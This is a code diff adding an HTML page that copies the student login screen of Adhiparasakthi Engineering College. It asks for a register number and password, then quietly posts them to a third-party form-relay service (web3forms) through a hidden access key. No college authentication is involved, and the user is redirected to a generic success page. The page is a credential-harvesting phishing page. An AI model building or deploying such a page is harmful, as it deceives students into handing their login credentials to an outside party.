@@ -1,0 +1,145 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adhiparasakthi Engineering College - Student Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:linear-gradient(135deg,#8B0000,#d32f2f);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.login-box{
+    width:380px;
+    background:#fff;
+    border-radius:15px;
+    padding:35px;
+    text-align:center;
+    box-shadow:0 0 20px rgba(0,0,0,.4);
+}
+
+.logo{
+    width:120px;
+    margin-bottom:10px;
+}
+
+h2{
+    color:#8B0000;
+    margin-bottom:5px;
+}
+
+p{
+    color:#555;
+    margin-bottom:20px;
+}
+
+.input-group{
+    text-align:left;
+    margin-bottom:15px;
+}
+
+.input-group label{
+    font-weight:bold;
+    display:block;
+    margin-bottom:5px;
+}
+
+.input-group input{
+    width:100%;
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    outline:none;
+    font-size:15px;
+}
+
+.input-group input:focus{
+    border:1px solid #8B0000;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    background:#8B0000;
+    color:white;
+    border:none;
+    border-radius:8px;
+    cursor:pointer;
+    font-size:16px;
+    transition:.3s;
+}
+
+button:hover{
+    background:#b71c1c;
+}
+
+.footer{
+    margin-top:15px;
+    font-size:13px;
+    color:#666;
+}
+</style>
+
+</head>
+<body>
+
+<div class="login-box">
+
+    <!-- Logo -->
+    <img src="logo.png" class="logo">
+
+    <h2>Student Login</h2>
+    <p>Adhiparasakthi Engineering College</p>
+
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+        <!-- Your Web3Forms Access Key -->
+        <input type="hidden" name="access_key" value="e760c71f-11f7-4964-99ff-eac4fffa4fad">
+
+        <input type="hidden" name="subject" value="Student Login Form">
+
+        <input type="hidden" name="redirect" value="https://web3forms.com/success">
+
+        <div class="input-group">
+            <label>Register Number</label>
+            <input
+                type="text"
+                name="Register Number"
+                placeholder="Enter Register Number"
+                required>
+        </div>
+
+        <div class="input-group">
+            <label>Demo Password</label>
+            <input
+                type="password"
+                name="Password"
+                placeholder="Enter Password"
+                required>
+        </div>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+    <div class="footer">
+        © Adhiparasakthi Engineering College
+    </div>
+
+</div>
+
+</body>
+</html>
